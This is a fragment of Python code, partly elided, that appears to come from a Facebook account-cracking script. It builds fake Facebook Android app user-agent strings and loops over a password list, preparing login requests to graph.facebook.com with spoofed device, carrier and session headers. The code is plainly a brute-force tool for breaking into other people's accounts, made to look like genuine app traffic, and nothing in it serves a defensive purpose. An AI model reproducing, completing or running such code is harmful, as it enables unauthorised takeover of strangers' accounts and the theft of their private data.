...
def uapi():
	...
	anv = str(random.randrange(7,13))+'0.0'
	fbop = str(random.randrange(5,20))
	ua = "FBAN/"+fban+";FBAV/"+fbav+";FBBV/"+fbbv+";FBDM/{density=3.0,width=1080,height=1920};FBLC/"+fblc+";FBRV/"+fbrv+";FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/"+fbpn+";FBDV/"+model+";FBSV/"+anv+";FBOP/"+fbop+";FBCA/armeabi-v7a:armeabi;]"
	return ua
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": uapi(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
